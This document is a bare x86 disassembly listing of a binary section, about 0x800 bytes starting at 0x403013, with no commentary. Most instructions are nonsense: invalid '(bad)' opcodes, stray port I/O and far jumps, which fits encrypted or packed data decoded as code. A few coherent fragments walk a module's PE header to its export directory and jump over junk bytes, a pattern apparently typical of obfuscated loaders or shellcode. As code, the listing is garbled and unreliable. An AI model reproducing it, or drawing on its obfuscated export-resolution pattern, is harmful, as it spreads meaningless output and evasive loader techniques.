  403013:	cmp    BYTE PTR [esi+0x175d7cc],cl
  403019:	mov    cl,0x5b
  40301b:	xchg   esi,eax
  40301c:	sbb    cl,BYTE PTR [edi+eiz*4]
  40301f:	xor    al,0xb8
  403021:	jno    0x403073
  403023:	push   esp
  403024:	add    ecx,DWORD PTR [eax*8-0x6041c65f]
  40302b:	into   
  40302c:	jge    0x403087
  40302e:	mov    ebx,0x21ed3957
  403033:	adc    eax,0x21a20e1c
  403038:	pusha  
  403039:	sub    al,0x98
  40303b:	fadd   st(5),st
  40303d:	push   edx
  40303e:	retw   
  403040:	daa    
  403041:	add    al,0x65
  403043:	dec    edx
  403044:	push   esi
  403045:	push   ss
  403046:	cmp    dl,BYTE PTR [edx]
  403048:	ret    0x46
  40304b:	fisttp WORD PTR [eax-0x3abfc40]
  403051:	popa   
  403052:	pop    es
  403053:	ret    0x2b29
  403056:	outs   dx,DWORD PTR ds:[esi]
  403057:	imul   edx,ecx,0xcf01f2e0
  40305d:	push   0x2779c04b
  403062:	iret   
  403063:	pop    ebp
  403064:	push   esi
  403065:	adc    al,0x9a
  403067:	cld    
  403068:	stos   BYTE PTR es:[edi],al
  403069:	lds    ebx,FWORD PTR [edx-0x44371a23]
  40306f:	mov    ebx,0xfc3f9341
  403074:	push   edx
  403075:	sub    al,0xd9
  403077:	mov    edi,0x5aa97854
  40307c:	mov    ebx,0x8b069c85
  403081:	inc    ebp
  403082:	or     BYTE PTR [ebx-0x651607b3],cl
  403088:	add    al,BYTE PTR [eax]
  40308a:	add    cl,dl
  40308c:	int3   
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	adc    DWORD PTR [eax+edi*2+0x781592d0],edi
  40309e:	js     0x40309e
  4030a0:	jle    0x40311a
  4030a2:	js     0x403065
  4030a4:	mov    eax,ds:0xa2a15dfb
  4030a9:	arpl   WORD PTR [ebx],cx
  4030ab:	xor    eax,esi
  4030ad:	xchg   ebp,eax
  4030ae:	pop    edi
  4030af:	retf   
  4030b0:	inc    esi
  4030b1:	nop
  4030b2:	fidivr WORD PTR [ebp+0x79]
  4030b5:	jp     0x4030fd
  4030b7:	and    al,0x86
  4030b9:	jo     0x403086
  4030bb:	push   ebx
  4030bc:	ss jne 0x403044
  4030bf:	lahf   
  4030c0:	push   ds
  4030c1:	retf   0xb01d
  4030c4:	xchg   edi,eax
  4030c5:	sub    ch,dl
  4030c7:	jg     0x403127
  4030c9:	push   es
  4030ca:	xchg   edi,eax
  4030cb:	push   cs
  4030cc:	add    DWORD PTR [ecx-0x23a67d65],0xffffffdb
  4030d3:	or     al,0x4d
  4030d5:	arpl   WORD PTR [eax+eax*4+0x1c05c01b],cx
  4030dc:	cmp    eax,0x4ca0a98
  4030e1:	mov    ax,ds:0x83a1c2d0
  4030e7:	hlt    
  4030e8:	imul   DWORD PTR ds:0x8e2a6e6f
  4030ee:	repnz sbb edi,DWORD PTR [eax]
  4030f1:	pop    edx
  4030f2:	fstp   TBYTE PTR [ebp+0x1f]
  4030f5:	test   eax,0xc1a8f652
  4030fa:	xor    BYTE PTR [eax+0x8],ah
  4030fd:	bound  edi,QWORD PTR [edx-0x40]
  403100:	or     edx,DWORD PTR [edi+0x33]
  403103:	ds repz sbb eax,0x1a509a0f
  40310a:	imul   ebp,ecx,0xfffffffd
  40310d:	dec    edi
  40310e:	jge    0x4030a0
  403110:	adc    cl,BYTE PTR [edx-0x6e]
  403113:	inc    edi
  403114:	ja     0x403128
  403116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403117:	hlt    
  403118:	enter  0x8fd2,0x1b
  40311c:	popf   
  40311d:	jns    0x403108
  40311f:	dec    ebp
  403120:	out    dx,eax
  403121:	jl     0x403195
  403123:	fisubr WORD PTR [ebp+0xec30822]
  403129:	aad    0x33
  40312b:	fcomp  QWORD PTR [esi]
  40312d:	jp     0x403163
  40312f:	loope  0x40311c
  403131:	or     BYTE PTR [ecx+0x64],al
  403134:	push   ecx
  403135:	fistp  DWORD PTR [ebp-0x5f8d488d]
  40313b:	dec    ebp
  40313c:	push   eax
  40313d:	cvtpi2ps xmm5,QWORD PTR [eax]
  403140:	cmc    
  403141:	dec    ecx
  403142:	loope  0x40314b
  403144:	xchg   ebx,eax
  403145:	pop    ebx
  403146:	out    0xa9,eax
  403148:	(bad)  
  403149:	sbb    eax,0x928a5068
  40314e:	mov    bh,0xc4
  403150:	adc    DWORD PTR [edi],ebp
  403152:	sub    eax,0x40c84a37
  403157:	into   
  403158:	iret   
  403159:	mov    bl,0xe3
  40315b:	dec    esp
  40315c:	ds into 
  40315e:	mov    ?,WORD PTR [esi-0x35]
  403161:	add    eax,0xf6a67133
  403166:	dec    ebp
  403167:	imul   DWORD PTR [ecx+edi*2]
  40316a:	sub    eax,0x221ebb49
  40316f:	and    al,0x15
  403171:	sahf   
  403172:	mov    cl,0x78
  403174:	fldcw  WORD PTR [ecx-0x7d]
  403177:	nop
  403178:	and    bl,BYTE PTR [ebx]
  40317a:	and    ebp,edx
  40317c:	imul   esp,esi,0x40
  40317f:	out    dx,al
  403180:	xchg   BYTE PTR [ebp-0x136e1bb5],al
  403186:	test   DWORD PTR [ecx-0x7c],ecx
  403189:	and    ebp,DWORD PTR [edi+0x5818714f]
  40318f:	in     al,dx
  403190:	jmp    0x40314a
  403192:	(bad)  
  403193:	js     0x40311b
  403195:	mov    edx,0xaa56038f
  40319a:	sbb    eax,0xf2c63956
  40319f:	jecxz  0x403185
  4031a1:	call   0x4fc1:0xd5133c65
  4031a8:	mov    dl,0xf
  4031aa:	pop    ebx
  4031ab:	add    dl,BYTE PTR [esp+ebp*4+0x64]
  4031af:	call   0x86cd:0x6667250d
  4031b6:	ins    BYTE PTR es:[edi],dx
  4031b7:	icebp  
  4031b8:	mov    esp,DWORD PTR [edx+0x4fcb02b2]
  4031be:	xchg   esp,eax
  4031bf:	(bad)  
  4031c0:	adc    ebx,DWORD PTR [esi+0xe]
  4031c3:	mov    cs,ecx
  4031c5:	push   edi
  4031c6:	adc    eax,0x590eef9a
  4031cb:	ret    0x84df
  4031ce:	test   DWORD PTR [eax+0x52],esp
  4031d1:	xchg   ebp,eax
  4031d2:	imul   DWORD PTR [esi-0x2a73eb17]
  4031d8:	fnstcw WORD PTR [ebp-0x3967c951]
  4031de:	stos   BYTE PTR es:[edi],al
  4031df:	add    ebp,DWORD PTR [ebx-0x2ba59119]
  4031e5:	ficomp WORD PTR [ebx-0x7ee2861b]
  4031eb:	fcomi  st,st(1)
  4031ed:	inc    eax
  4031ee:	test   eax,0x5fd42ec
  4031f3:	or     edx,ecx
  4031f5:	dec    edi
  4031f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f7:	ds adc eax,0x7c220072
  4031fd:	sub    DWORD PTR [edx-0x755b2b49],ecx
  403203:	jg     0x403238
  403205:	lods   eax,DWORD PTR ds:[esi]
  403206:	jmp    0x917b:0x8a10845e
  40320d:	rol    DWORD PTR ds:0x91b4a5c6,1
  403213:	imul   ebp,DWORD PTR [esi],0x50
  403216:	add    BYTE PTR [edi+0x1c8bbf2c],dh
  40321c:	lock pop es
  40321e:	mov    ah,BYTE PTR [ebp+eiz*4-0x331b85f2]
  403225:	adc    eax,DWORD PTR cs:[ecx]
  403228:	out    dx,eax
  403229:	mov    cl,0xdb
  40322b:	adc    ebp,edx
  40322d:	pop    ds
  40322e:	dec    esi
  40322f:	stc    
  403230:	out    dx,al
  403231:	and    bh,bh
  403233:	sub    dl,BYTE PTR [eax+0x704b5cd1]
  403239:	inc    edx
  40323a:	cmp    al,0xb3
  40323c:	mov    dh,BYTE PTR [edx-0x17]
  40323f:	push   cs
  403240:	adc    DWORD PTR [ebx],0x2a
  403243:	adc    ax,0x7af6
  403247:	es into 
  403249:	loop   0x4032ac
  40324b:	in     al,0x8c
  40324d:	jg     0x4031df
  40324f:	sub    edx,DWORD PTR [edi]
  403251:	cmp    DWORD PTR [eax-0x406265c3],eax
  403257:	or     eax,0xd2faae37
  40325c:	mov    ?,WORD PTR [edx-0x10747c52]
  403262:	xchg   esi,eax
  403263:	and    DWORD PTR ds:0x5c92bda3,esp
  403269:	in     al,0x37
  40326b:	je     0x4031f0
  40326d:	mov    ebp,0x570cd4c9
  403272:	jle    0x403202
  403274:	dec    esi
  403275:	cmp    ch,BYTE PTR [ebx]
  403277:	lods   eax,DWORD PTR ds:[esi]
  403278:	and    DWORD PTR [esi-0x578fefec],edi
  40327e:	cmp    esp,DWORD PTR [edi+0x54]
  403281:	xchg   DWORD PTR [esp+edi*1-0x6f2d8740],edi
  403288:	leave  
  403289:	dec    ebp
  40328a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40328b:	sar    DWORD PTR [ebp+0x267647aa],cl
  403291:	retf   
  403292:	mov    ah,0x81
  403294:	into   
  403295:	inc    esp
  403296:	xor    bh,dl
  403298:	push   eax
  403299:	out    dx,eax
  40329a:	push   ecx
  40329b:	ss pop ebp
  40329d:	dec    ebp
  40329e:	gs ds push ebp
  4032a1:	and    BYTE PTR [esp+ebp*2-0x64323a53],cl
  4032a8:	dec    ecx
  4032a9:	div    BYTE PTR [edx+0x25231ece]
  4032af:	mov    ebx,0x99a4f947
  4032b4:	mov    ds:0x5014e98a,eax
  4032b9:	jno    0x403332
  4032bb:	mov    edi,0x9412f396
  4032c0:	rol    BYTE PTR [esi+0x5f25a552],cl
  4032c6:	jle    0x403268
  4032c8:	sar    BYTE PTR [ebx-0x7e43f2cd],cl
  4032ce:	mov    ecx,0xf439490d
  4032d3:	and    BYTE PTR [ebx+ecx*1+0x31],bh
  4032d7:	push   edi
  4032d8:	imul   eax,DWORD PTR [esi-0x59],0xffffffc0
  4032dc:	dec    esi
  4032dd:	add    esi,edx
  4032df:	outs   dx,DWORD PTR ds:[esi]
  4032e0:	fisttp QWORD PTR [ecx]
  4032e2:	dec    esi
  4032e3:	fld    DWORD PTR [eax-0x1a]
  4032e6:	mov    eax,0x50004f9c
  4032eb:	push   0x7e
  4032ed:	lods   eax,DWORD PTR ds:[esi]
  4032ee:	adc    al,0x88
  4032f0:	mov    esp,DWORD PTR [ecx+0x6c]
  4032f3:	sbb    DWORD PTR [edi],ebx
  4032f5:	sti    
  4032f6:	fs push ecx
  4032f8:	scas   eax,DWORD PTR es:[edi]
  4032f9:	lds    eax,FWORD PTR [eax+0x15]
  4032fc:	loop   0x4032ef
  4032fe:	jae    0x40328a
  403300:	push   esp
  403301:	mov    ecx,?
  403303:	xor    eax,0x7c2bf5c2
  403308:	call   0x9f5346ea
  40330d:	adc    al,0x5
  40330f:	shl    BYTE PTR [edx],0xf
  403312:	mov    ebp,0x539ac747
  403317:	inc    edi
  403318:	dec    ecx
  403319:	fwait
  40331a:	stos   BYTE PTR es:[edi],al
  40331b:	stc    
  40331c:	ins    DWORD PTR es:[edi],dx
  40331d:	sub    eax,0xbc4bf605
  403322:	imul   ecx,DWORD PTR [ecx+0x3c63393],0xf0139c7
  40332c:	test   BYTE PTR [eax-0x74fffff3],bl
  403332:	dec    ebp
  403333:	in     al,dx
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x54c23cb6]
  403372:	cmc    
  403373:	(bad)  
  403374:	pop    ss
  403375:	adc    BYTE PTR [edx],bl
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x403373
  40337e:	push   ecx
  40337f:	loopne 0x403347
  403381:	jl     0x403381
  403383:	rcl    BYTE PTR [esi+ecx*8+0x4f7d917b],cl
  40338a:	inc    esp
  40338b:	scas   al,BYTE PTR es:[edi]
  40338c:	mov    eax,0xce812a71
  403391:	jl     0x4033ec
  403393:	clc    
  403394:	shl    cl,0xbb
  403397:	sbb    al,0x54
  403399:	xor    edi,DWORD PTR ds:0x943f61d9
  40339f:	push   ebp
  4033a0:	int    0x1
  4033a2:	sbb    ebp,ebp
  4033a4:	mov    edx,0x5b5e971e
  4033a9:	xor    ebx,DWORD PTR [edx+ebp*1+0x6f]
  4033ad:	fmul   DWORD PTR [edx]
  4033af:	adc    ah,BYTE PTR [ebx]
  4033b1:	dec    ebx
  4033b2:	inc    ebx
  4033b3:	push   0xe1bf9f0f
  4033b8:	add    ah,ah
  4033ba:	outs   dx,BYTE PTR ds:[esi]
  4033bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033bc:	sti    
  4033bd:	cmp    al,0x7a
  4033bf:	mov    al,0x72
  4033c1:	xor    DWORD PTR [ebx+0x70],0x8832aefc
  4033c8:	jae    0x4033cd
  4033ca:	neg    BYTE PTR [ecx+0x55c0af82]
  4033d0:	jo     0x4033e0
  4033d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d3:	bnd jae 0x4033ee
  4033d6:	adc    eax,0xa11539bf
  4033db:	fisttp DWORD PTR [ecx+0x24]
  4033de:	das    
  4033df:	das    
  4033e0:	and    edi,DWORD PTR [eax-0x34d9acae]
  4033e6:	jo     0x40344d
  4033e8:	pop    esi
  4033e9:	xlat   BYTE PTR ds:[ebx]
  4033ea:	pop    ss
  4033eb:	inc    esp
  4033ec:	fs dec esi
  4033ee:	jno    0x403429
  4033f0:	sub    al,0x97
  4033f2:	ret    
  4033f3:	adc    DWORD PTR [edi-0x62],esp
  4033f6:	or     eax,0xd8894040
  4033fb:	adc    DWORD PTR [eax+0x56],eax
  4033fe:	mov    edx,0x5cd0f3c3
  403403:	jns    0x4033ea
  403405:	jb     0x40338f
  403407:	lds    ebx,FWORD PTR [edi+0x247ddbf3]
  40340d:	pop    esp
  40340e:	cmp    eax,DWORD PTR [ebx+0x3c]
  403411:	inc    edi
  403412:	sbb    DWORD PTR [ebx],eax
  403414:	je     0x4033b8
  403416:	jmp    0x22cda59e
  40341b:	jb     0x40342f
  40341d:	adc    ebp,ebp
  40341f:	gs call 0x534470e6
  403425:	mov    eax,0xb05a0a69
  40342a:	xchg   edx,eax
  40342b:	jo     0x403433
  40342d:	cmp    edx,edi
  40342f:	xchg   edx,eax
  403430:	mov    BYTE PTR [eax+0x29],al
  403433:	sbb    DWORD PTR [esi+eiz*4+0x36d7a50a],edx
  40343a:	adc    ebp,eax
  40343c:	push   0xffffff84
  40343e:	mov    ecx,0x1785f899
  403443:	test   eax,0x8fd9233b
  403448:	je     0x403431
  40344a:	cmc    
  40344b:	stos   DWORD PTR es:[edi],eax
  40344c:	cwde   
  40344d:	call   0x23cb33bc
  403452:	or     eax,0xbd2c0b5e
  403457:	ret    
  403458:	mov    esp,0xe03a563e
  40345d:	out    0x2b,al
  40345f:	or     dl,BYTE PTR [edx]
  403461:	add    eax,0x1b9ea39f
  403466:	(bad)  
  403468:	push   ecx
  403469:	mov    esp,0xe7071e7
  40346e:	cmp    cl,BYTE PTR [eax+0x4ecb67cb]
  403474:	aas    
  403475:	(bad)  
  403476:	cmp    DWORD PTR [ebp+0x503ae318],edx
  40347c:	lock and eax,0x13b90357
  403482:	add    eax,0x7685d2cf
  403487:	pop    es
  403488:	iret   
  403489:	sub    DWORD PTR [edi],esp
  40348b:	pusha  
  40348c:	cmp    al,0xf4
  40348e:	cmp    bl,dl
  403490:	pop    es
  403491:	and    al,ch
  403493:	jae    0x40343b
  403495:	(bad)  
  403496:	jne    0x403451
  403498:	(bad)  
  403499:	mov    eax,ds:0xc540bbc
  40349e:	jl     0x4034cc
  4034a0:	pop    ss
  4034a1:	mov    dh,0xc0
  4034a3:	fmul   DWORD PTR [edx]
  4034a5:	call   0x856cf74
  4034aa:	popf   
  4034ab:	push   ebx
  4034ac:	stos   DWORD PTR es:[edi],eax
  4034ad:	fwait
  4034ae:	jg     0x403505
  4034b0:	mov    ecx,0xe94954f2
  4034b5:	test   eax,0xed5cc40f
  4034ba:	inc    eax
  4034bb:	outs   dx,BYTE PTR ds:[esi]
  4034bc:	mov    ?,WORD PTR [esi]
  4034be:	sub    eax,0x5f0f4f75
  4034c3:	jae    0x403470
  4034c5:	mov    dh,0x12
  4034c7:	gs in  eax,dx
  4034c9:	or     esp,ecx
  4034cb:	sub    BYTE PTR [ebx],al
  4034cd:	and    cl,ah
  4034cf:	push   eax
  4034d0:	gs jne 0x40346f
  4034d3:	or     ch,BYTE PTR [eax+0x5a8ab7b5]
  4034d9:	fidiv  WORD PTR [eax+0x45125024]
  4034df:	cmp    DWORD PTR [ebx-0x13],0x6c52ebfb
  4034e6:	pop    esi
  4034e7:	pop    eax
  4034e8:	in     eax,dx
  4034e9:	retf   
  4034ea:	cli    
  4034eb:	leave  
  4034ec:	cmp    DWORD PTR [ecx-0x77],eax
  4034ef:	ss pop ebp
  4034f1:	push   esi
  4034f2:	jb     0x40349d
  4034f4:	cmp    DWORD PTR [ebx+eax*4+0x14],esp
  4034f8:	es daa 
  4034fa:	jnp    0x40349c
  4034fc:	out    dx,eax
  4034fd:	imul   ecx,DWORD PTR [edi+0x47],0x48c48d21
  403504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403505:	in     al,0xae
  403507:	jno    0x40352e
  403509:	fs or  eax,0xd29d3db8
  40350f:	sbb    esi,esp
  403511:	dec    edx
  403512:	xchg   ebp,eax
  403513:	xchg   ebp,eax
  403514:	stc    
  403515:	pop    DWORD PTR [ebp+0x2aa9f350]
  40351b:	and    DWORD PTR [edx],edx
  40351d:	push   eax
  40351e:	pop    esp
  40351f:	adc    ecx,DWORD PTR [esi+0x7c8ff2e5]
  403525:	sti    
  403526:	adc    BYTE PTR [esi],ch
  403528:	les    edi,FWORD PTR [esi+0x6b]
  40352b:	call   ebp
  40352d:	dec    ebx
  40352e:	dec    edx
  40352f:	push   ebx
  403530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403531:	adc    DWORD PTR ds:0x1c18b519,0xf3faf573
  40353b:	and    edi,DWORD PTR [ebx]
  40353d:	les    edx,FWORD PTR [ebp-0x739f240c]
  403543:	or     ch,BYTE PTR [edi+0x230131c4]
  403549:	fdivr  DWORD PTR [eax+0x1afe353e]
  40354f:	mov    cs,edx
  403551:	ins    DWORD PTR es:[edi],dx
  403552:	arpl   WORD PTR [edi],si
  403554:	mov    ecx,0x41a17355
  403559:	sub    eax,0x46df8768
  40355e:	add    dl,BYTE PTR [ebx+edx*8-0x56]
  403562:	add    edi,DWORD PTR [esi]
  403564:	loope  0x403514
  403566:	hlt    
  403567:	cmp    bh,BYTE PTR [edx]
  403569:	lea    edx,[ebx-0x12]
  40356c:	adc    eax,0xe986d95e
  403571:	pop    esi
  403572:	mov    bl,0x68
  403574:	cmp    esp,DWORD PTR [eax-0x1fad0cc1]
  40357a:	mov    ebx,0xb16f0e62
  40357f:	fiadd  DWORD PTR [eax+edi*1+0x76334d7d]
  403586:	xchg   esp,eax
  403587:	hlt    
  403588:	sub    DWORD PTR [esi-0x7d],ebx
  40358b:	daa    
  40358c:	test   DWORD PTR [ebx+0x6951fcdf],0xf3a84b04
  403596:	sar    DWORD PTR [esi+0x107eebd3],0xbd
  40359d:	cwde   
  40359e:	(bad)  [esi-0xd1e08b9]
  4035a4:	out    0xba,al
  4035a6:	adc    DWORD PTR [esi],0xffffffc8
  4035a9:	jge    0x4035c7
  4035ab:	push   ds
  4035ac:	call   0x3c19b7da
  4035b1:	call   0x3a1a:0x373e09a0
  4035b8:	dec    edx
  4035b9:	pushf  
  4035ba:	adc    DWORD PTR [esi+0x2],esi
  4035bd:	or     edi,DWORD PTR ds:0xa5ed8a00
  4035c3:	sbb    BYTE PTR [esi+0x7f515f],dh
  4035c9:	or     DWORD PTR [ebx+0x4d],esp
  4035cc:	inc    edi
  4035cd:	sbb    DWORD PTR [ebp+0x3dec3ff2],0x405da706
  4035d7:	lods   al,BYTE PTR ds:[esi]
  4035d8:	int3   
  4035d9:	mov    eax,0xe982cdba
  4035de:	(bad)  
  4035df:	lahf   
  4035e0:	add    esp,ebp
  4035e2:	ins    BYTE PTR es:[edi],dx
  4035e3:	sub    DWORD PTR [eax+0xf3e52ec],ebp
  4035e9:	daa    
  4035ea:	adc    al,0xa0
  4035ec:	rcl    DWORD PTR [edx-0x4c1e8d1c],1
  4035f2:	ins    DWORD PTR es:[edi],dx
  4035f3:	jl     0x4035ac
  4035f5:	imul   esp,DWORD PTR [edx-0x6aa8372],0x30
  4035fc:	jmp    0xc6734992
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0xc7419511,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x403621
  40363f:	out    0xc3,eax
  403641:	sar    ebp,cl
  403643:	rcr    BYTE PTR [esp+esi*2+0xa906247],0xc9
  40364b:	or     ecx,eax
  40364d:	pop    ebp
  40364e:	repz das 
  403650:	hlt    
  403651:	in     al,0x32
  403653:	ret    
  403654:	in     al,0x2e
  403656:	leave  
  403657:	shr    DWORD PTR [esi-0x5b],cl
  40365a:	les    esi,FWORD PTR [edx+0xf]
  40365d:	nop
  40365e:	pop    eax
  40365f:	shl    DWORD PTR [ecx-0x47ee4f2b],cl
  403665:	dec    eax
  403666:	xor    ebp,DWORD PTR [esi+ecx*4-0x1f]
  40366a:	fucomip st,st(4)
  40366c:	sbb    dh,BYTE PTR [esi-0x26]
  40366f:	jo     0x4036b3
  403671:	cmp    al,0x48
  403673:	sub    eax,0xfd9c3223
  403678:	mov    ds:0x720769e8,eax
  40367d:	aad    0x26
  40367f:	jae    0x403634
  403681:	test   ah,0xdd
  403684:	(bad)  
  403686:	fsubr  DWORD PTR [edx+edi*2]
  403689:	xchg   esi,eax
  40368a:	xor    eax,0xea140e7
  40368f:	ja     0x40363f
  403691:	rcr    DWORD PTR [edx+0x5dd43fa9],cl
  403697:	not    eax
  403699:	cmp    BYTE PTR [esi-0x3],0x52
  40369d:	cmp    eax,DWORD PTR [eax+0x468f4e06]
  4036a3:	ins    BYTE PTR es:[edi],dx
  4036a4:	and    al,0x43
  4036a6:	icebp  
  4036a7:	pop    ds
  4036a8:	arpl   WORD PTR [edx-0x20dcce41],sp
  4036ae:	mov    ah,0xb3
  4036b0:	mov    edx,0xc4241604
  4036b5:	repnz sub al,0x6b
  4036b8:	push   ecx
  4036b9:	cmp    DWORD PTR [edx+0x52],ebx
  4036bc:	inc    eax
  4036bd:	rol    DWORD PTR [edx-0x32],0x63
  4036c1:	xchg   DWORD PTR [edi+0x6a83fad9],eax
  4036c7:	ror    BYTE PTR [esi],cl
  4036c9:	xchg   edx,eax
  4036ca:	fnstsw WORD PTR [edi+eiz*8-0x1c]
  4036ce:	cmp    dh,bl
  4036d0:	inc    ecx
  4036d1:	rcl    eax,cl
  4036d3:	cld    
  4036d4:	scas   eax,DWORD PTR es:[edi]
  4036d5:	inc    esp
  4036d6:	stos   DWORD PTR es:[edi],eax
  4036d7:	test   eax,edi
  4036d9:	jmp    0x40371a
  4036db:	sub    bh,BYTE PTR [edi+0x3a631c02]
  4036e1:	xchg   esi,eax
  4036e2:	xor    BYTE PTR [esi-0x4ae74586],cl
  4036e8:	ret    
  4036e9:	ficom  DWORD PTR [eax]
  4036eb:	add    ebp,esp
  4036ed:	xlat   BYTE PTR ds:[ebx]
  4036ee:	push   cs
  4036ef:	push   ebp
  4036f0:	pop    ebp
  4036f1:	fisubr DWORD PTR [ecx-0x2f4cdbe4]
  4036f7:	ss daa 
  4036f9:	sbb    DWORD PTR es:[edi+0x5a],0xffffffeb
  4036fe:	xor    ebp,ecx
  403700:	addr16 inc edi
  403702:	lods   eax,DWORD PTR ds:[esi]
  403703:	sbb    esi,DWORD PTR [ecx-0x32ffd108]
  403709:	scas   eax,DWORD PTR es:[edi]
  40370a:	sbb    BYTE PTR [ebx+ebp*1],bl
  40370d:	ret    0x5c3a
  403710:	and    ebp,DWORD PTR [ebx-0x38]
  403713:	add    BYTE PTR [edi+0x11c7a4c1],bl
  403719:	ret    
  40371a:	cwde   
  40371b:	adc    DWORD PTR [edx+0x3f7d2d19],ebp
  403721:	std    
  403722:	xchg   ecx,eax
  403723:	sub    BYTE PTR [ecx+eax*2+0x44403f76],ch
  40372a:	scas   al,BYTE PTR es:[edi]
  40372b:	sub    al,0x12
  40372d:	loope  0x403798
  40372f:	push   edx
  403730:	sub    ah,bl
  403732:	push   ebx
  403733:	aaa    
  403734:	cmp    eax,ebx
  403736:	cs mov dl,0x8a
  403739:	popf   
  40373a:	popf   
  40373b:	xchg   esi,eax
  40373c:	fcomi  st,st(1)
  40373e:	test   al,0xa6
  403740:	mov    WORD PTR [eax+0x2aff5287],es
  403746:	(bad)  
  403747:	call   0xb0a927d5
  40374c:	nop
  40374d:	iret   
  40374e:	sahf   
  40374f:	xchg   esi,eax
  403750:	inc    eax
  403751:	jmp    FWORD PTR [esi+eax*1-0x28]
  403755:	ret    
  403756:	mov    bh,0xa9
  403758:	xchg   DWORD PTR [edi],ebp
  40375a:	mov    ds:0x34e72934,eax
  40375f:	mov    eax,0xef077915
  403764:	ss pop ss
  403766:	inc    edi
  403767:	jp     0x40377a
  403769:	loopne 0x403721
  40376b:	bound  ecx,QWORD PTR [ecx+0x46]
  40376e:	or     eax,0xbbdd540c
  403773:	jmp    0x403721
  403775:	and    esp,DWORD PTR [ebp+0xe759d6c]
  40377b:	jno    0x4037cf
  40377d:	or     ah,BYTE PTR [eax]
  40377f:	push   ebx
  403780:	jmp    0xe7dc7094
  403785:	xor    al,0x47
  403787:	sbb    esi,DWORD PTR [ecx]
  403789:	mov    ebp,DWORD PTR [edx-0x69824417]
  40378f:	push   edi
  403790:	cmp    ebp,DWORD PTR [edi-0xd]
  403793:	push   ds
  403794:	fcmovnbe st,st(2)
  403796:	enter  0x896a,0x56
  40379a:	popf   
  40379b:	adc    al,0xa1
  40379d:	jge    0x40371f
  40379f:	cmp    BYTE PTR es:[esi+0x31],ah
  4037a3:	jbe    0x403801
  4037a5:	jns    0x4037a5
  4037a7:	sub    BYTE PTR [edi-0x33],ah
  4037aa:	mov    edx,0x734635dc
  4037af:	dec    ecx
  4037b0:	je     0x403734
  4037b2:	inc    esp
  4037b3:	(bad)  
  4037b4:	jmp    DWORD PTR [ebx*2-0x7126307a]
  4037bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037bc:	fwait
  4037bd:	xor    ebx,DWORD PTR [eax-0x74]
  4037c0:	mov    edx,0x595f7239
  4037c5:	sbb    al,0x9
  4037c7:	fst    DWORD PTR [ebx+0x536be6e4]
  4037cd:	xor    BYTE PTR [esi-0x54],dl
  4037d0:	jmp    0x403838
  4037d2:	fldcw  WORD PTR [ecx-0xb]
  4037d5:	inc    DWORD PTR [ecx-0x78]
  4037d8:	js     0x4037ea
  4037da:	inc    eax
  4037db:	add    esp,ecx
  4037dd:	sbb    ebp,edx
  4037df:	sub    edi,DWORD PTR [edi+0x2e]
  4037e2:	inc    esi
  4037e3:	scas   eax,DWORD PTR es:[edi]
  4037e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037e5:	in     eax,dx
  4037e6:	test   al,0x5f
  4037e8:	push   ecx
  4037e9:	test   al,0xb0
  4037eb:	xor    dh,bl
  4037ed:	mov    WORD PTR [edi-0x23fe8161],ss
  4037f3:	jle    0x4037d3
  4037f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037f6:	mov    edx,0x87eac806
  4037fb:	jns    0x4037bd
  4037fd:	int3   
  4037fe:	adc    edi,DWORD PTR [eax+eax*8]
  403801:	cmp    eax,0x1ec34ca6
  403806:	add    DWORD PTR [edi+edi*2],ebx
  403809:	lods   eax,DWORD PTR ds:[esi]
  40380a:	dec    eax
  40380b:	mov    bl,0x52
  40380d:	mov    eax,0xd14e0265
  403812:	jno    0x4037b8
  403814:	mov    bh,0x9e
  403816:	add    eax,0x6b2afb43
  40381b:	pop    ecx
  40381c:	fdivrp st(3),st
  40381e:	dec    edx
  40381f:	bound  eax,QWORD PTR [eax-0x42]
  403822:	in     eax,0x82
  403824:	ins    DWORD PTR es:[edi],dx
  403825:	test   al,0xc9
  403827:	lock xor ah,BYTE PTR [ecx]
